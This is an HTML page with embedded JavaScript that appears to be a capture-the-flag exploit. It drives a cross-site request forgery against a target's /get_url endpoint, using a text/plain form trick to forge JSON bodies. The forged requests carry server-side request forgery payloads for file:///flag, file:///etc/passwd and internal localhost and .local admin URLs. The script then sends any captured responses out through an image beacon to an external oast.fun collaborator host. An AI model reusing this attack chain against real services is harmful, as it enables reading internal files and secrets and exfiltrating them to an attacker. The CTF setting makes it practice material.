<!DOCTYPE html>
<iframe name="ssrfResult" style="display:none"></iframe>

<script>
const TARGET = 'https://tasks.goidactf.ru:20185';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// URLs для тестирования
const testURLs = [
    'file:///flag',
    'file:///etc/passwd',
    'http://d39b126c-4ef5-4750-8740-2efb6b0b0166.local/admin',
    'http://8447d341-c19f-4e29-8561-e345a5cf6c26.local/flag',
    'http://localhost/flag',
    'http://127.0.0.1:80/flag'
];

testURLs.forEach((url, index) => {
    setTimeout(() => {
        // Создаём форму которая отправит запрос
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = TARGET + '/get_url';
        form.target = 'ssrfResult';
        form.enctype = 'text/plain';
        
        // Создаём правильный JSON
        const input = document.createElement('input');
        input.name = `{"url":"${url}","test":"`;
        input.value = 'test"}';
        
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
        
        // Через 3 секунды читаем window.name iframe
        setTimeout(() => {
            try {
                const result = window.frames['ssrfResult'].name;
                if (result && result.length > 0) {
                    // Отправляем результат
                    new Image().src = COLLAB + '/?ssrf_data_' + index + '=' + 
                                     encodeURIComponent(result.substring(0, 500));
                }
            } catch(e) {
                // CORS блокирует - это нормально
            }
        }, 3000);
    }, index * 5000); // 5 секунд между запросами
});
</script>
